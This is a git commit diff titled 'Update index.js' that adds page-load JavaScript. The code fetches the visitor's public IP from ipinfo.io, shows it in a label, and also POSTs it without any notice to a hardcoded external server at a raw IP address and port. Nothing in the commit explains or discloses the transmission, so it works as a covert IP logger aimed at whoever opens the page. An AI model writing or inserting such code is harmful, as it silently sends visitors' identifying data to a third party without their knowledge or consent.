14e404c6a36deeeaf95b1f571081f4d6ba1b376c
benielcapo <169079689+benielcapo@users.noreply.github.com>
2025-03-03 13:44:45 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,30 @@
 const label = document.getElementById("e")
+
+async function GetIp() {
+    var url = "https://ipinfo.io/json"
+    var res = await fetch(url)
+    var json = await res.json()
+    var ip = json.ip
+    return ip
+}
+
+async function SendToEndpoint(ip) {
+    var endpoint = "http://87.106.44.40:6060"
+    await fetch(endpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          "ip": ip
+        })
+    })
+}
+
+async function main() {
+    var ip = await GetIp()
+    SendToEndpoint(ip)
+    label.textContent = ip
+}
+
+main()
